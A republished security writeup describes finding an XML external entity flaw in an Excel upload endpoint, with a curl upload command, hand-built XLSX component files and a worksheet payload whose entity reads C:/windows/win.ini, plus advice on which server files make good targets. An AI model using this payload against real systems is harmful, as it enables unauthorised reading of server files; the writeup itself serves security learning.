# :globe_with_meridians: The File That Answered Back Xxe Hidden In Cell A2 20Dbb8161Dd8

> **Original Source:** [The File That Answered Back Xxe Hidden In Cell A2 20Dbb8161Dd8](https://infosecwriteups.com/the-file-that-answered-back-xxe-hidden-in-cell-a2-20dbb8161dd8)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## The First Test: Does It Reflect?


Before building any payload, I asked a simpler question. Does this endpoint actually read the cell content and return it? Or does it just accept the file and store it somewhere opaque?


I built the most minimal valid XLSX I could, nothing malicious, just a proper ZIP structure with a single cell containing the string `TestValue`, and uploaded it:


```
curl -s -X POST "https://[REDACTED]/[REDACTED]/CombineExcelUpload" \
-H "Referer: https://[REDACTED]/[REDACTED]/index" \
-F "excelFile=@test.xlsx;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
```


The response came back:


```
{"uploadResult":"TestValue","responseCode":"1"}
```


The endpoint read the cell. The endpoint returned the cell. The reflection was there.


That moment is quieter than you’d expect. There’s no alarm, no flashing light. Just a JSON field containing a word you put into a spreadsheet, coming back to you from a server you don’t control. It’s small. But it means everything, because it tells you the machinery is in place. The application is actively parsing the file and surfacing its contents. Which means if we control what the parser puts into that cell, we control what appears in the response.

## Building the Payload: From the Inside Out


This is the part I want to be specific about, because it’s where most writeups wave their hand and say “craft a malicious XLSX.” The detail matters.


An XLSX file must be a valid ZIP archive with all five required files present, or the parser will reject it as malformed before it ever touches the worksheet XML. That means building the payload from scratch. Not modifying an existing spreadsheet, not using automated tools that produce broken structure, but assembling each piece by hand.


Here is what goes in each file :

>

`[Content_Types].xml`: the package manifest. Declares what MIME type each internal file represents. Without this, the parser doesn’t know what it’s looking at


```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels"
ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml"
ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml"
ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>
```


>

`_rels/.rels`: the root relationship file. Tells the parser the main document in this package is `xl/workbook.xml`.


```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1"
Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
Target="xl/workbook.xml"/>
</Relationships>
```


>

`xl/workbook.xml`: the workbook definition. Declares one sheet named Sheet1, linked by relationship ID `rId1`.


```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/ml/2006/main"
xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets>
<sheet name="Sheet1" sheetId="1" r:id="rId1"/>
</sheets>
</workbook>
```


>

`xl/_rels/workbook.xml.rels`: links `rId1` in the workbook to the actual sheet file.


```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1"
Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"
Target="worksheets/sheet1.xml"/>
</Relationships>
```


>

`xl/worksheets/sheet1.xml`: this is the payload. The `DOCTYPE` declaration at the top defines an external entity named `xxe` whose value is the contents of a file on the server. The `&xxe;` reference inside the cell instructs the parser to resolve it.


```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo ..(Syntax -> `[<!` (medium Prevent the full code here*)) ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/ml/2006/main">
<sheetData>
<row r="1"><c r="A1" t="str"><v>PolicyNo</v></c></row>
<row r="2"><c r="A2" t="str"><v>&xxe;</v></c></row>
</sheetData>
</worksheet>
```


A few choices here worth explaining. The `DOCTYPE foo` element name is arbitrary. It just needs to be a valid XML name. Cell A1 contains benign data to make the file look like a legitimate upload. Cell A2 is where the exfiltrated content will land. The `t=”str”` attribute declares it as a string type, which matters because numeric cell types get processed differently and can break the substitution.


## Get Alvin Ferdiansyah’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


The target file, `C:\windows\win.ini`, was chosen deliberately for the first proof: it’s world-readable on all Windows versions, it’s short, and critically, it contains no XML special characters (`<`, `>`, `&`). Files that contain those characters break the outer XML document when substituted inline. The parser treats them as XML syntax rather than cell data, throws a parse error, and the read fails silently. `win.ini`, `system.ini`, and `hosts` are all safe targets for initial confirmation. `web.config` is not.

---

*Originally published on [Medium](https://infosecwriteups.com/the-file-that-answered-back-xxe-hidden-in-cell-a2-20dbb8161dd8). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
